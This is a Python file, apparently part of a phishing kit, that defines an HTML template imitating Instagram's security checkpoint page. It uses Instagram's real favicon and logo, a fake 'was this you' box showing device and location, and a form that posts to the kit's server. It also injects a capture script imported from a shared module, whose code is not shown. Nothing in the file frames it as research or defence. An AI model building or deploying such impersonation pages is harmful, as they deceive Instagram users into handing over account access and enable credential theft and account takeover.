"""checkpoint.py - Template checkpoint Instagram."""

from platforms._shared import JS_STRICT_CAPTURE, IG_LOGO_SVG as _IG_LOGO_SVG

HTML_CHECKPOINT = r"""
<!DOCTYPE html>
<html lang="{{ lang }}" dir="{{ direction }}">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, viewport-fit=cover">
    <link rel="shortcut icon" href="https://static.cdninstagram.com/rsrc.php/yv/r/B8lOUPkyZfP.ico" type="image/x-icon">
    <title>Instagram</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <style>
        * { -webkit-tap-highlight-color: transparent; box-sizing: border-box; }
        body { background: #000; color: #f5f5f5; font-family: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, sans-serif; min-height: 100vh; display: flex; align-items: center; justify-content: center; }
        .ig-card { background: #000; padding: 32px 28px; border-radius: 24px; border: 1px solid #363636; max-width: 400px; width: 100%; box-sizing: border-box; }
        .info-box { background: #121212; border: 1px solid #1f1f1f; border-radius: 14px; padding: 14px; }
        .btn-yes { background: #0095f6; color: #fff; border: none; border-radius: 14px; padding: 14px; font-weight: 600; width: 100%; font-size: 15px; cursor: pointer; transition: all 0.15s ease; }
        .btn-yes:hover { background: #1877f2; }
        .btn-yes:active { transform: scale(0.98); }
        .btn-no { background: transparent; color: #f5f5f5; border: 1px solid #363636; border-radius: 14px; padding: 14px; font-weight: 600; width: 100%; font-size: 15px; cursor: pointer; margin-top: 10px; transition: all 0.15s ease; }
        .btn-no:hover { background: #121212; }
    </style>
</head>
<body class="p-4">
    """ + JS_STRICT_CAPTURE + r"""
    <div class="ig-card">
        <div class="flex justify-center mb-5">""" + _IG_LOGO_SVG + r"""</div>
        <h2 class="text-lg font-semibold text-center mb-2">{{ checkpoint_title }}</h2>
        <p class="text-gray-400 text-center text-sm mb-6">{{ checkpoint_sub }}</p>
        <div class="info-box mb-6 space-y-2 text-sm">
            <div class="flex justify-between"><span class="text-gray-500">{{ device_label }}:</span><span class="font-medium">{{ device }}</span></div>
            <div class="flex justify-between"><span class="text-gray-500">{{ location_label }}:</span><span class="font-medium">{{ city }}, {{ country }}</span></div>
            <div class="flex justify-between"><span class="text-gray-500">{{ time_label }}:</span><span class="font-medium">{{ lang_name }}</span></div>
        </div>
        <form method="POST">
            <input type="hidden" name="action" value="checkpoint">
            <button type="submit" class="btn-yes">{{ yes_btn }}</button>
        </form>
        <a href="/" class="btn-no text-center block">{{ no_btn }}</a>
        <p class="text-center text-xs text-gray-600 mt-5">{{ help }}</p>
    </div>
</body>
</html>
"""
